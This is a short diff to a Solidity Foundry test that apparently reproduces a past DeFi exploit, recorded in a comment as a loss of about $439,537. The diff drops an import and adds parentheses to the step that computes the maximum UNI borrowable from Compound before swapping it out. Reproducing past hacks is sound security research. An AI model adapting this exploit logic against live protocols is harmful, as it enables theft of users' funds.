@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~439537 US$
 // Attacker : 0xe000008459b74a91e306a47c808061dfa372000e
@@ -72,7 +71,7 @@ contract ContractTest is Test {
 
         // The max amount of UNI we can borrow = AccountLiquidity / UNI's price in compound
         uint256 max_UNI_borrow =
-            myTotalLiquidity / UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 10 ** uni.decimals();
+            (myTotalLiquidity / UniswapAnchoredView.getUnderlyingPrice(address(cUniToken))) * 10 ** uni.decimals();
         cUniToken.borrow(max_UNI_borrow);
 
         // Swap: UNI => WETH => USDC, for the low Slippage
